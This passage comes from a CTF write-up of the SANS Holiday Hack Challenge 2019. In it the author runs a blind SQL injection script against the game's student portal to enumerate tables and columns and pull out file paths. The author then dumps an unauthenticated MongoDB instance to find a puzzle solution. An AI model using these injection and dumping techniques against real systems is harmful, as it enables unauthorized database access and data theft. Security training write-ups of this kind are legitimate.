&lt;li&gt;Then, I call &lt;code&gt;LPAD(___, 7, '0')&lt;/code&gt; to pad this binary string with zeros,
until it has a length of 7.&lt;/li&gt;
&lt;li&gt;I then call &lt;code&gt;MID&lt;/code&gt; again, to extract a particular bit from this binary
string.&lt;/li&gt;
&lt;li&gt;I then test to see if this bit is equal to one or not.&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;This allows me to retrieve the string I'm interested in bit by bit, instead of
character by character. It's a little bit faster.&lt;/p&gt;
&lt;p&gt;So, let's run this script to retrieve information from the database. First,
let's get the different tables for the &lt;code&gt;elfu&lt;/code&gt; database:&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;$ ./blind_injection.py -u &lt;span class="s2"&gt;&amp;quot;https://studentportal.elfu.org/application-check.php&amp;quot;&lt;/span&gt; -s &lt;span class="s1"&gt;&amp;#39;still pending!&amp;#39;&lt;/span&gt; -c table_name -t information_schema.tables -w &lt;span class="s2"&gt;&amp;quot;WHERE table_schema=&amp;#39;elfu&amp;#39;&amp;quot;&lt;/span&gt; -i &lt;span class="m"&gt;0&lt;/span&gt;
Blind Injection &lt;span class="o"&gt;(&lt;/span&gt;Copyright &lt;span class="m"&gt;2014&lt;/span&gt; Yannick Méheut &amp;lt;useless &lt;span class="o"&gt;(&lt;/span&gt;at&lt;span class="o"&gt;)&lt;/span&gt; utouch &lt;span class="o"&gt;(&lt;/span&gt;dot&lt;span class="o"&gt;)&lt;/span&gt; fr&amp;gt;&lt;span class="o"&gt;)&lt;/span&gt;

&lt;span class="o"&gt;[&lt;/span&gt;&lt;span class="k"&gt;done&lt;/span&gt;&lt;span class="o"&gt;]&lt;/span&gt; retrieving data:    applications
&lt;span class="hll"&gt;found: applications
&lt;/span&gt;$ ./blind_injection.py -u &lt;span class="s2"&gt;&amp;quot;https://studentportal.elfu.org/application-check.php&amp;quot;&lt;/span&gt; -s &lt;span class="s1"&gt;&amp;#39;still pending!&amp;#39;&lt;/span&gt; -c table_name -t information_schema.tables -w &lt;span class="s2"&gt;&amp;quot;WHERE table_schema=&amp;#39;elfu&amp;#39;&amp;quot;&lt;/span&gt; -i &lt;span class="m"&gt;1&lt;/span&gt;
Blind Injection &lt;span class="o"&gt;(&lt;/span&gt;Copyright &lt;span class="m"&gt;2014&lt;/span&gt; Yannick Méheut &amp;lt;useless &lt;span class="o"&gt;(&lt;/span&gt;at&lt;span class="o"&gt;)&lt;/span&gt; utouch &lt;span class="o"&gt;(&lt;/span&gt;dot&lt;span class="o"&gt;)&lt;/span&gt; fr&amp;gt;&lt;span class="o"&gt;)&lt;/span&gt;

&lt;span class="o"&gt;[&lt;/span&gt;&lt;span class="k"&gt;done&lt;/span&gt;&lt;span class="o"&gt;]&lt;/span&gt; retrieving data:    krampus
&lt;span class="hll"&gt;found: krampus
&lt;/span&gt;$ ./blind_injection.py -u &lt;span class="s2"&gt;&amp;quot;https://studentportal.elfu.org/application-check.php&amp;quot;&lt;/span&gt; -s &lt;span class="s1"&gt;&amp;#39;still pending!&amp;#39;&lt;/span&gt; -c table_name -t information_schema.tables -w &lt;span class="s2"&gt;&amp;quot;WHERE table_schema=&amp;#39;elfu&amp;#39;&amp;quot;&lt;/span&gt; -i &lt;span class="m"&gt;2&lt;/span&gt;
Blind Injection &lt;span class="o"&gt;(&lt;/span&gt;Copyright &lt;span class="m"&gt;2014&lt;/span&gt; Yannick Méheut &amp;lt;useless &lt;span class="o"&gt;(&lt;/span&gt;at&lt;span class="o"&gt;)&lt;/span&gt; utouch &lt;span class="o"&gt;(&lt;/span&gt;dot&lt;span class="o"&gt;)&lt;/span&gt; fr&amp;gt;&lt;span class="o"&gt;)&lt;/span&gt;

&lt;span class="o"&gt;[&lt;/span&gt;&lt;span class="k"&gt;done&lt;/span&gt;&lt;span class="o"&gt;]&lt;/span&gt; retrieving data:    students
&lt;span class="hll"&gt;found: students
&lt;/span&gt;$ ./blind_injection.py -u &lt;span class="s2"&gt;&amp;quot;https://studentportal.elfu.org/application-check.php&amp;quot;&lt;/span&gt; -s &lt;span class="s1"&gt;&amp;#39;still pending!&amp;#39;&lt;/span&gt; -c table_name -t information_schema.tables -w &lt;span class="s2"&gt;&amp;quot;WHERE table_schema=&amp;#39;elfu&amp;#39;&amp;quot;&lt;/span&gt; -i &lt;span class="m"&gt;3&lt;/span&gt;
Blind Injection &lt;span class="o"&gt;(&lt;/span&gt;Copyright &lt;span class="m"&gt;2014&lt;/span&gt; Yannick Méheut &amp;lt;useless &lt;span class="o"&gt;(&lt;/span&gt;at&lt;span class="o"&gt;)&lt;/span&gt; utouch &lt;span class="o"&gt;(&lt;/span&gt;dot&lt;span class="o"&gt;)&lt;/span&gt; fr&amp;gt;&lt;span class="o"&gt;)&lt;/span&gt;

&lt;span class="o"&gt;[&lt;/span&gt;&lt;span class="k"&gt;done&lt;/span&gt;&lt;span class="o"&gt;]&lt;/span&gt; retrieving data:
no result found
&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;Alright, the table &lt;code&gt;krampus&lt;/code&gt; seems interesting. Let's see the columns of
this table:&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;$ ./blind_injection.py -u &lt;span class="s2"&gt;&amp;quot;https://studentportal.elfu.org/application-check.php&amp;quot;&lt;/span&gt; -s &lt;span class="s1"&gt;&amp;#39;still pending!&amp;#39;&lt;/span&gt; -c column_name -t information_schema.columns -w &lt;span class="s2"&gt;&amp;quot;WHERE table_name=&amp;#39;krampus&amp;#39;&amp;quot;&lt;/span&gt; -i &lt;span class="m"&gt;0&lt;/span&gt;
Blind Injection &lt;span class="o"&gt;(&lt;/span&gt;Copyright &lt;span class="m"&gt;2014&lt;/span&gt; Yannick Méheut &amp;lt;useless &lt;span class="o"&gt;(&lt;/span&gt;at&lt;span class="o"&gt;)&lt;/span&gt; utouch &lt;span class="o"&gt;(&lt;/span&gt;dot&lt;span class="o"&gt;)&lt;/span&gt; fr&amp;gt;&lt;span class="o"&gt;)&lt;/span&gt;

&lt;span class="o"&gt;[&lt;/span&gt;&lt;span class="k"&gt;done&lt;/span&gt;&lt;span class="o"&gt;]&lt;/span&gt; retrieving data: id
&lt;span class="hll"&gt;found: id
&lt;/span&gt;$ ./blind_injection.py -u &lt;span class="s2"&gt;&amp;quot;https://studentportal.elfu.org/application-check.php&amp;quot;&lt;/span&gt; -s &lt;span class="s1"&gt;&amp;#39;still pending!&amp;#39;&lt;/span&gt; -c column_name -t information_schema.columns -w &lt;span class="s2"&gt;&amp;quot;WHERE table_name=&amp;#39;krampus&amp;#39;&amp;quot;&lt;/span&gt; -i &lt;span class="m"&gt;1&lt;/span&gt;
Blind Injection &lt;span class="o"&gt;(&lt;/span&gt;Copyright &lt;span class="m"&gt;2014&lt;/span&gt; Yannick Méheut &amp;lt;useless &lt;span class="o"&gt;(&lt;/span&gt;at&lt;span class="o"&gt;)&lt;/span&gt; utouch &lt;span class="o"&gt;(&lt;/span&gt;dot&lt;span class="o"&gt;)&lt;/span&gt; fr&amp;gt;&lt;span class="o"&gt;)&lt;/span&gt;

&lt;span class="o"&gt;[&lt;/span&gt;&lt;span class="k"&gt;done&lt;/span&gt;&lt;span class="o"&gt;]&lt;/span&gt; retrieving data: path
&lt;span class="hll"&gt;found: path
&lt;/span&gt;$ ./blind_injection.py -u &lt;span class="s2"&gt;&amp;quot;https://studentportal.elfu.org/application-check.php&amp;quot;&lt;/span&gt; -s &lt;span class="s1"&gt;&amp;#39;still pending!&amp;#39;&lt;/span&gt; -c column_name -t information_schema.columns -w &lt;span class="s2"&gt;&amp;quot;WHERE table_name=&amp;#39;krampus&amp;#39;&amp;quot;&lt;/span&gt; -i &lt;span class="m"&gt;2&lt;/span&gt;
Blind Injection &lt;span class="o"&gt;(&lt;/span&gt;Copyright &lt;span class="m"&gt;2014&lt;/span&gt; Yannick Méheut &amp;lt;useless &lt;span class="o"&gt;(&lt;/span&gt;at&lt;span class="o"&gt;)&lt;/span&gt; utouch &lt;span class="o"&gt;(&lt;/span&gt;dot&lt;span class="o"&gt;)&lt;/span&gt; fr&amp;gt;&lt;span class="o"&gt;)&lt;/span&gt;

&lt;span class="o"&gt;[&lt;/span&gt;&lt;span class="k"&gt;done&lt;/span&gt;&lt;span class="o"&gt;]&lt;/span&gt; retrieving data:
no result found
&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;Two columns, &lt;code&gt;id&lt;/code&gt; and &lt;code&gt;path&lt;/code&gt;. Let's extract data from the
&lt;code&gt;path&lt;/code&gt; column:&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;$ ./blind_injection.py -u &lt;span class="s2"&gt;&amp;quot;https://studentportal.elfu.org/application-check.php&amp;quot;&lt;/span&gt; -s &lt;span class="s1"&gt;&amp;#39;still pending!&amp;#39;&lt;/span&gt; -c path -t krampus -i &lt;span class="m"&gt;0&lt;/span&gt;
Blind Injection &lt;span class="o"&gt;(&lt;/span&gt;Copyright &lt;span class="m"&gt;2014&lt;/span&gt; Yannick Méheut &amp;lt;useless &lt;span class="o"&gt;(&lt;/span&gt;at&lt;span class="o"&gt;)&lt;/span&gt; utouch &lt;span class="o"&gt;(&lt;/span&gt;dot&lt;span class="o"&gt;)&lt;/span&gt; fr&amp;gt;&lt;span class="o"&gt;)&lt;/span&gt;

&lt;span class="o"&gt;[&lt;/span&gt;&lt;span class="k"&gt;done&lt;/span&gt;&lt;span class="o"&gt;]&lt;/span&gt; retrieving data:    /krampus/0f5f510e.png
found: /krampus/0f5f510e.png
$ ./blind_injection.py -u &lt;span class="s2"&gt;&amp;quot;https://studentportal.elfu.org/application-check.php&amp;quot;&lt;/span&gt; -s &lt;span class="s1"&gt;&amp;#39;still pending!&amp;#39;&lt;/span&gt; -c path -t krampus -i &lt;span class="m"&gt;1&lt;/span&gt;
Blind Injection &lt;span class="o"&gt;(&lt;/span&gt;Copyright &lt;span class="m"&gt;2014&lt;/span&gt; Yannick Méheut &amp;lt;useless &lt;span class="o"&gt;(&lt;/span&gt;at&lt;span class="o"&gt;)&lt;/span&gt; utouch &lt;span class="o"&gt;(&lt;/span&gt;dot&lt;span class="o"&gt;)&lt;/span&gt; fr&amp;gt;&lt;span class="o"&gt;)&lt;/span&gt;

&lt;span class="o"&gt;[&lt;/span&gt;&lt;span class="k"&gt;done&lt;/span&gt;&lt;span class="o"&gt;]&lt;/span&gt; retrieving data:    /krampus/1cc7e121.png
found: /krampus/1cc7e121.png
$ ./blind_injection.py -u &lt;span class="s2"&gt;&amp;quot;https://studentportal.elfu.org/application-check.php&amp;quot;&lt;/span&gt; -s &lt;span class="s1"&gt;&amp;#39;still pending!&amp;#39;&lt;/span&gt; -c path -t krampus -i &lt;span class="m"&gt;2&lt;/span&gt;
Blind Injection &lt;span class="o"&gt;(&lt;/span&gt;Copyright &lt;span class="m"&gt;2014&lt;/span&gt; Yannick Méheut &amp;lt;useless &lt;span class="o"&gt;(&lt;/span&gt;at&lt;span class="o"&gt;)&lt;/span&gt; utouch &lt;span class="o"&gt;(&lt;/span&gt;dot&lt;span class="o"&gt;)&lt;/span&gt; fr&amp;gt;&lt;span class="o"&gt;)&lt;/span&gt;

&lt;span class="o"&gt;[&lt;/span&gt;&lt;span class="k"&gt;done&lt;/span&gt;&lt;span class="o"&gt;]&lt;/span&gt; retrieving data:    /krampus/439f15e6.png
found: /krampus/439f15e6.png
$ ./blind_injection.py -u &lt;span class="s2"&gt;&amp;quot;https://studentportal.elfu.org/application-check.php&amp;quot;&lt;/span&gt; -s &lt;span class="s1"&gt;&amp;#39;still pending!&amp;#39;&lt;/span&gt; -c path -t krampus -i &lt;span class="m"&gt;3&lt;/span&gt;
Blind Injection &lt;span class="o"&gt;(&lt;/span&gt;Copyright &lt;span class="m"&gt;2014&lt;/span&gt; Yannick Méheut &amp;lt;useless &lt;span class="o"&gt;(&lt;/span&gt;at&lt;span class="o"&gt;)&lt;/span&gt; utouch &lt;span class="o"&gt;(&lt;/span&gt;dot&lt;span class="o"&gt;)&lt;/span&gt; fr&amp;gt;&lt;span class="o"&gt;)&lt;/span&gt;

&lt;span class="o"&gt;[&lt;/span&gt;&lt;span class="k"&gt;done&lt;/span&gt;&lt;span class="o"&gt;]&lt;/span&gt; retrieving data:    /krampus/667d6896.png
found: /krampus/667d6896.png
$ ./blind_injection.py -u &lt;span class="s2"&gt;&amp;quot;https://studentportal.elfu.org/application-check.php&amp;quot;&lt;/span&gt; -s &lt;span class="s1"&gt;&amp;#39;still pending!&amp;#39;&lt;/span&gt; -c path -t krampus -i &lt;span class="m"&gt;4&lt;/span&gt;
Blind Injection &lt;span class="o"&gt;(&lt;/span&gt;Copyright &lt;span class="m"&gt;2014&lt;/span&gt; Yannick Méheut &amp;lt;useless &lt;span class="o"&gt;(&lt;/span&gt;at&lt;span class="o"&gt;)&lt;/span&gt; utouch &lt;span class="o"&gt;(&lt;/span&gt;dot&lt;span class="o"&gt;)&lt;/span&gt; fr&amp;gt;&lt;span class="o"&gt;)&lt;/span&gt;

&lt;span class="o"&gt;[&lt;/span&gt;&lt;span class="k"&gt;done&lt;/span&gt;&lt;span class="o"&gt;]&lt;/span&gt; retrieving data:    /krampus/adb798ca.png
found: /krampus/adb798ca.png
$ ./blind_injection.py -u &lt;span class="s2"&gt;&amp;quot;https://studentportal.elfu.org/application-check.php&amp;quot;&lt;/span&gt; -s &lt;span class="s1"&gt;&amp;#39;still pending!&amp;#39;&lt;/span&gt; -c path -t krampus -i &lt;span class="m"&gt;5&lt;/span&gt;
Blind Injection &lt;span class="o"&gt;(&lt;/span&gt;Copyright &lt;span class="m"&gt;2014&lt;/span&gt; Yannick Méheut &amp;lt;useless &lt;span class="o"&gt;(&lt;/span&gt;at&lt;span class="o"&gt;)&lt;/span&gt; utouch &lt;span class="o"&gt;(&lt;/span&gt;dot&lt;span class="o"&gt;)&lt;/span&gt; fr&amp;gt;&lt;span class="o"&gt;)&lt;/span&gt;

&lt;span class="o"&gt;[&lt;/span&gt;&lt;span class="k"&gt;done&lt;/span&gt;&lt;span class="o"&gt;]&lt;/span&gt; retrieving data:    /krampus/ba417715.png
found: /krampus/ba417715.png
$ ./blind_injection.py -u &lt;span class="s2"&gt;&amp;quot;https://studentportal.elfu.org/application-check.php&amp;quot;&lt;/span&gt; -s &lt;span class="s1"&gt;&amp;#39;still pending!&amp;#39;&lt;/span&gt; -c path -t krampus -i &lt;span class="m"&gt;6&lt;/span&gt;
Blind Injection &lt;span class="o"&gt;(&lt;/span&gt;Copyright &lt;span class="m"&gt;2014&lt;/span&gt; Yannick Méheut &amp;lt;useless &lt;span class="o"&gt;(&lt;/span&gt;at&lt;span class="o"&gt;)&lt;/span&gt; utouch &lt;span class="o"&gt;(&lt;/span&gt;dot&lt;span class="o"&gt;)&lt;/span&gt; fr&amp;gt;&lt;span class="o"&gt;)&lt;/span&gt;

&lt;span class="o"&gt;[&lt;/span&gt;&lt;span class="k"&gt;done&lt;/span&gt;&lt;span class="o"&gt;]&lt;/span&gt; retrieving data:
no result found
&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;We found six different paths to PNG files. We can download them from the
Student Portal. Weirdly enough, I couldn't download these files from my
browser, I had to download them using &lt;code&gt;wget&lt;/code&gt;. Anyway, here are the six
scraps of paper we were searching:&lt;/p&gt;
&lt;ul class="simple"&gt;
&lt;li&gt;&lt;a class="reference external" href="/images/sans-christmas-challenge-2019/0f5f510e.png"&gt;First scrap&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a class="reference external" href="/images/sans-christmas-challenge-2019/1cc7e121.png"&gt;Second scrap&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a class="reference external" href="/images/sans-christmas-challenge-2019/439f15e6.png"&gt;Third scrap&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a class="reference external" href="/images/sans-christmas-challenge-2019/667d6896.png"&gt;Fourth scrap&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a class="reference external" href="/images/sans-christmas-challenge-2019/adb798ca.png"&gt;Fifth scrap&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a class="reference external" href="/images/sans-christmas-challenge-2019/ba417715.png"&gt;Sixth scrap&lt;/a&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;We can try to reconstruct the full letter in GIMP, by moving the pieces:&lt;/p&gt;
&lt;img alt="letter.png" class="align-center" src="/images/sans-christmas-challenge-2019/letter.png" /&gt;
&lt;p&gt;Here's what it says:&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;From the Desk of [...]&lt;/p&gt;
&lt;p&gt;Date: August 23, 20[...]&lt;/p&gt;
&lt;p&gt;Memo to Self:&lt;/p&gt;
&lt;p&gt;Finally! I've figured out how to destroy Christmas! Santa has a brand new
cutting edge sleigh guidance technology, called the Super Sled-o-matic.&lt;/p&gt;
&lt;p&gt;I've figured out a way to poison the data going into the system so that it
will divert Santa's sled on Christmas Eve!&lt;/p&gt;
&lt;p&gt;Santa will be unable to make the trip and the holiday season will be
destroyed! Santa's own technology will undermine him!&lt;/p&gt;
&lt;p&gt;That's what they deserve for not listening to my suggestions for supporting
other holiday characters!&lt;/p&gt;
&lt;p&gt;Bwahahahahaha!&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;The upper-right corner is torn, so we can't say who it's from. But the
background drawing looks &lt;a class="reference external" href="https://en.wikipedia.org/wiki/Human_tooth"&gt;familiar&lt;/a&gt;...&lt;/p&gt;
&lt;/div&gt;
&lt;/div&gt;
&lt;div class="section" id="objective-10"&gt;
&lt;h2&gt;&lt;a class="toc-backref" href="#id34"&gt;Objective 10:&lt;/a&gt;&lt;/h2&gt;
&lt;div class="section" id="holly-evergreen-s-cranberry-pi-challenge"&gt;
&lt;h3&gt;&lt;a class="toc-backref" href="#id35"&gt;Holly Evergreen's Cranberry Pi Challenge&lt;/a&gt;&lt;/h3&gt;
&lt;p&gt;We must help Holly find the information she's looking for in MongoDB:&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;span class="go"&gt;Hello dear player!  Won&amp;#39;t you please come help me get my wish!&lt;/span&gt;
&lt;span class="go"&gt;I&amp;#39;m searching teacher&amp;#39;s database, but all I find are fish!&lt;/span&gt;
&lt;span class="go"&gt;Do all his boating trips effect some database dilution?&lt;/span&gt;
&lt;span class="go"&gt;It should not be this hard for me to find the quiz solution!&lt;/span&gt;

&lt;span class="go"&gt;Find the solution hidden in the MongoDB on this system.&lt;/span&gt;

&lt;span class="gp"&gt;elf@c6444428f1f4:~$&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;Let's try to connect to MongoDB:&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;span class="gp"&gt;elf@c6444428f1f4:~$&lt;/span&gt; mongo
&lt;span class="go"&gt;MongoDB shell version v3.6.3&lt;/span&gt;
&lt;span class="go"&gt;connecting to: mongodb://127.0.0.1:27017&lt;/span&gt;
&lt;span class="go"&gt;2019-12-24T11:54:26.073+0000 W NETWORK  [thread1] Failed to connect to 127.0.0.1:27017, in(checking socket for error after poll), reason: Connection refused&lt;/span&gt;
&lt;span class="go"&gt;2019-12-24T11:54:26.073+0000 E QUERY    [thread1] Error: couldn&amp;#39;t connect to server 127.0.0.1:27017, connection attempt failed :&lt;/span&gt;
&lt;span class="go"&gt;connect@src/mongo/shell/mongo.js:251:13&lt;/span&gt;
&lt;span class="go"&gt;@(connect):1:6&lt;/span&gt;
&lt;span class="go"&gt;exception: connect failed&lt;/span&gt;


&lt;span class="hll"&gt;&lt;span class="go"&gt;Hmm... what if Mongo isn&amp;#39;t running on the default port?&lt;/span&gt;
&lt;/span&gt;&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;We can't seem to connect to MongoDB on the default port. As the hint suggests,
maybe it's running on a different port:&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;span class="gp"&gt;elf@c6444428f1f4:~$&lt;/span&gt; netstat -tlpn
&lt;span class="go"&gt;(No info could be read for &amp;quot;-p&amp;quot;: geteuid()=1001 but you should be root.)&lt;/span&gt;
&lt;span class="go"&gt;Active Internet connections (only servers)&lt;/span&gt;
&lt;span class="go"&gt;Proto Recv-Q Send-Q Local Address           Foreign Address         State       PID/Program name&lt;/span&gt;
&lt;span class="hll"&gt;&lt;span class="go"&gt;tcp        0      0 127.0.0.1:12121         0.0.0.0:*               LISTEN      -&lt;/span&gt;
&lt;/span&gt;&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;Alright, there seems to be a program listening on port 12121. Let's try that:&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;span class="gp"&gt;elf@c6444428f1f4:~$&lt;/span&gt; mongo --port &lt;span class="m"&gt;12121&lt;/span&gt;
&lt;span class="go"&gt;MongoDB shell version v3.6.3&lt;/span&gt;
&lt;span class="go"&gt;connecting to: mongodb://127.0.0.1:12121/&lt;/span&gt;
&lt;span class="go"&gt;MongoDB server version: 3.6.3&lt;/span&gt;
&lt;span class="go"&gt;Welcome to the MongoDB shell.&lt;/span&gt;
&lt;span class="go"&gt;For interactive help, type &amp;quot;help&amp;quot;.&lt;/span&gt;
&lt;span class="go"&gt;For more comprehensive documentation, see&lt;/span&gt;
&lt;span class="go"&gt;        http://docs.mongodb.org/&lt;/span&gt;
&lt;span class="go"&gt;Questions? Try the support group&lt;/span&gt;
&lt;span class="go"&gt;        http://groups.google.com/group/mongodb-user&lt;/span&gt;
&lt;span class="go"&gt;Server has startup warnings:&lt;/span&gt;
&lt;span class="go"&gt;2019-12-24T11:53:42.669+0000 I CONTROL  [initandlisten]&lt;/span&gt;
&lt;span class="go"&gt;2019-12-24T11:53:42.669+0000 I CONTROL  [initandlisten] ** WARNING: Access control is not enabled for the database.&lt;/span&gt;
&lt;span class="go"&gt;2019-12-24T11:53:42.669+0000 I CONTROL  [initandlisten] **          Read and write access to data and configuration is unrestricted.&lt;/span&gt;
&lt;span class="go"&gt;2019-12-24T11:53:42.669+0000 I CONTROL  [initandlisten]&lt;/span&gt;
&lt;span class="go"&gt;2019-12-24T11:53:42.669+0000 I CONTROL  [initandlisten]&lt;/span&gt;
&lt;span class="go"&gt;2019-12-24T11:53:42.669+0000 I CONTROL  [initandlisten] ** WARNING: /sys/kernel/mm/transparent_hugepage/enabled is &amp;#39;always&amp;#39;.&lt;/span&gt;
&lt;span class="go"&gt;2019-12-24T11:53:42.669+0000 I CONTROL  [initandlisten] **        We suggest setting it to &amp;#39;never&amp;#39;&lt;/span&gt;
&lt;span class="go"&gt;2019-12-24T11:53:42.670+0000 I CONTROL  [initandlisten]&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;It's working! Let's list the available databases:&lt;/p&gt;
&lt;pre class="literal-block"&gt;
&amp;gt; show dbs
admin   0.000GB
config  0.000GB
elfu    0.000GB
local   0.000GB
test    0.000GB
&lt;/pre&gt;
&lt;p&gt;Hmm, it might take a while to search in all these databases. They don't seem
to be particularly heavy. Maybe we can dump them all and search for the
solution using regular shell tools. We can dump the content of MongoDB using
&lt;code&gt;mongodump&lt;/code&gt;:&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;span class="gp"&gt;elf@c6444428f1f4:~$&lt;/span&gt; mongodump --port &lt;span class="m"&gt;12121&lt;/span&gt;
&lt;span class="go"&gt;2019-12-24T11:59:43.690+0000    writing admin.system.version to&lt;/span&gt;
&lt;span class="go"&gt;2019-12-24T11:59:43.691+0000    done dumping admin.system.version (1 document)&lt;/span&gt;
&lt;span class="go"&gt;2019-12-24T11:59:43.691+0000    writing elfu.metadata to&lt;/span&gt;
&lt;span class="go"&gt;2019-12-24T11:59:43.691+0000    writing elfu.line to&lt;/span&gt;
&lt;span class="go"&gt;2019-12-24T11:59:43.691+0000    writing elfu.tincan to&lt;/span&gt;
&lt;span class="go"&gt;2019-12-24T11:59:43.692+0000    writing elfu.solution to&lt;/span&gt;
&lt;span class="go"&gt;2019-12-24T11:59:43.692+0000    done dumping elfu.line (1 document)&lt;/span&gt;
&lt;span class="go"&gt;2019-12-24T11:59:43.692+0000    writing elfu.bait to&lt;/span&gt;
&lt;span class="go"&gt;2019-12-24T11:59:43.692+0000    done dumping elfu.metadata (15 documents)&lt;/span&gt;
&lt;span class="go"&gt;2019-12-24T11:59:43.692+0000    writing elfu.tackle to&lt;/span&gt;
&lt;span class="go"&gt;2019-12-24T11:59:43.693+0000    done dumping elfu.bait (1 document)&lt;/span&gt;
&lt;span class="go"&gt;2019-12-24T11:59:43.693+0000    done dumping elfu.tackle (1 document)&lt;/span&gt;
&lt;span class="go"&gt;2019-12-24T11:59:43.693+0000    writing elfu.chum to&lt;/span&gt;
&lt;span class="go"&gt;2019-12-24T11:59:43.693+0000    writing test.redherring to&lt;/span&gt;
&lt;span class="go"&gt;2019-12-24T11:59:43.693+0000    done dumping elfu.tincan (1 document)&lt;/span&gt;
&lt;span class="go"&gt;2019-12-24T11:59:43.693+0000    done dumping elfu.chum (1 document)&lt;/span&gt;
&lt;span class="go"&gt;2019-12-24T11:59:43.740+0000    done dumping test.redherring (1 document)&lt;/span&gt;
&lt;span class="go"&gt;2019-12-24T11:59:43.740+0000    done dumping elfu.solution (1 document)&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;Now that everything is dumped, let's take a loot at the available files:&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;span class="gp"&gt;elf@c6444428f1f4:~$&lt;/span&gt; ls -lR dump/
&lt;span class="go"&gt;dump/:&lt;/span&gt;
&lt;span class="go"&gt;total 12&lt;/span&gt;
&lt;span class="go"&gt;drwxr-xr-x 2 elf elf 4096 Dec 24 11:59 admin&lt;/span&gt;
&lt;span class="go"&gt;drwxr-xr-x 2 elf elf 4096 Dec 24 11:59 elfu&lt;/span&gt;
&lt;span class="go"&gt;drwxr-xr-x 2 elf elf 4096 Dec 24 11:59 test&lt;/span&gt;

&lt;span class="go"&gt;dump/admin:&lt;/span&gt;
&lt;span class="go"&gt;total 8&lt;/span&gt;
&lt;span class="go"&gt;-rw-r--r-- 1 elf elf  59 Dec 24 11:59 system.version.bson&lt;/span&gt;
&lt;span class="go"&gt;-rw-r--r-- 1 elf elf 134 Dec 24 11:59 system.version.metadata.json&lt;/span&gt;

&lt;span class="go"&gt;dump/elfu:&lt;/span&gt;
&lt;span class="go"&gt;total 56&lt;/span&gt;
&lt;span class="go"&gt;-rw-r--r-- 1 elf elf   19 Dec 24 11:59 bait.bson&lt;/span&gt;
&lt;span class="go"&gt;-rw-r--r-- 1 elf elf  123 Dec 24 11:59 bait.metadata.json&lt;/span&gt;
&lt;span class="go"&gt;-rw-r--r-- 1 elf elf   19 Dec 24 11:59 chum.bson&lt;/span&gt;
&lt;span class="go"&gt;-rw-r--r-- 1 elf elf  123 Dec 24 11:59 chum.metadata.json&lt;/span&gt;
&lt;span class="go"&gt;-rw-r--r-- 1 elf elf   31 Dec 24 11:59 line.bson&lt;/span&gt;
&lt;span class="go"&gt;-rw-r--r-- 1 elf elf  123 Dec 24 11:59 line.metadata.json&lt;/span&gt;
&lt;span class="go"&gt;-rw-r--r-- 1 elf elf 3147 Dec 24 11:59 metadata.bson&lt;/span&gt;
&lt;span class="go"&gt;-rw-r--r-- 1 elf elf  127 Dec 24 11:59 metadata.metadata.json&lt;/span&gt;
&lt;span class="hll"&gt;&lt;span class="go"&gt;-rw-r--r-- 1 elf elf  116 Dec 24 11:59 solution.bson&lt;/span&gt;
&lt;/span&gt;&lt;span class="go"&gt;-rw-r--r-- 1 elf elf  127 Dec 24 11:59 solution.metadata.json&lt;/span&gt;
&lt;span class="go"&gt;-rw-r--r-- 1 elf elf   24 Dec 24 11:59 tackle.bson&lt;/span&gt;
&lt;span class="go"&gt;-rw-r--r-- 1 elf elf  125 Dec 24 11:59 tackle.metadata.json&lt;/span&gt;
&lt;span class="go"&gt;-rw-r--r-- 1 elf elf   23 Dec 24 11:59 tincan.bson&lt;/span&gt;
&lt;span class="go"&gt;-rw-r--r-- 1 elf elf  125 Dec 24 11:59 tincan.metadata.json&lt;/span&gt;

&lt;span class="go"&gt;dump/test:&lt;/span&gt;
&lt;span class="go"&gt;total 8&lt;/span&gt;
&lt;span class="go"&gt;-rw-r--r-- 1 elf elf  59 Dec 24 11:59 redherring.bson&lt;/span&gt;
&lt;span class="go"&gt;-rw-r--r-- 1 elf elf 129 Dec 24 11:59 redherring.metadata.json&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;The &lt;code&gt;dump/elfu/solution.bson&lt;/code&gt; file seems promising. Let's check it:&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;span class="gp"&gt;elf@c6444428f1f4:~$&lt;/span&gt; cat dump/elfu/solution.bson
&lt;span class="go"&gt;t_id fYou did good! Just run the command between the stars: ** db.loadServerScripts();displaySolution(); **&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;Alright, we're now supposed to run a command in MongoDB. Let's connect back to
it:&lt;/p&gt;
